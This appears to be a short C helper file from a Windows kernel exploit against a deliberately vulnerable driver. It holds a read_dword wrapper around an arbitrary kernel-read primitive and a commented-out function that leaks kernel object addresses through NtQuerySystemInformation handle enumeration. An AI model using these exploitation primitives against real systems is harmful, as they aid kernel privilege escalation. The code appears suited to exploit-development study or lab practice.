#include <stdio.h>
#include <stdint.h>

#include "vuln_driver_client.h"

unsigned int read_dword(uintptr_t where)
{
    int ret = 0;

    arbitrary_read(where, (char*)&ret, 4);
    return ret;
}



// DWORD64 get_addr_with_handle(HANDLE hObjectHandle)
// {
//     NTSTATUS st;
// 	PSYSTEM_EXTENDED_HANDLE_INFORMATION handleInfo;
// 	ULONG handleInfoLen = 0x10000;
// 	DWORD pid = GetCurrentProcessId();
//     DWORD nMaxSearchTry = 0x100;

// 	DWORD64 ret = 0;

//     if (g_pNtQuerySystemInformation == NULL)
//     {
//         HMODULE h = LoadLibraryA("ntdll.dll");
//         g_pNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(h, "NtQuerySystemInformation");
//         CloseHandle(h);
//     }

// 	for (UINT j = 0; j < nMaxSearchTry; j++)
// 	{

// 		handleInfoLen = 0x10000;
// 		handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)malloc(handleInfoLen);
// 		while ((st = g_pNtQuerySystemInformation(
// 			SystemExtendedHandleInformation,
// 			handleInfo,
// 			handleInfoLen,
// 			NULL
// 		)) == STATUS_INFO_LENGTH_MISMATCH)
// 			handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)realloc(handleInfo, handleInfoLen *= 2);


// 		// NtQuerySystemInformation stopped giving us STATUS_INFO_LENGTH_MISMATCH.
// 		if (!NT_SUCCESS(st)) {
// 			fprintf(stderr, "[-]NtQuerySystemInformation failed !");
// 			return 0;
// 		}
// 		for (UINT i = 0; i < handleInfo->NumberOfHandles; i++)
// 		{
// 			if (handleInfo->Handles[i].HandleValue == hObjectHandle && pid == handleInfo->Handles[i].UniqueProcessId)
// 			{
// 				ret = ((DWORD64)(handleInfo->Handles[i].Object));
// 				free(handleInfo);
// 				return ret;
// 			}
// 		}
// 		free(handleInfo);
// 	}
// 	return 0;
// }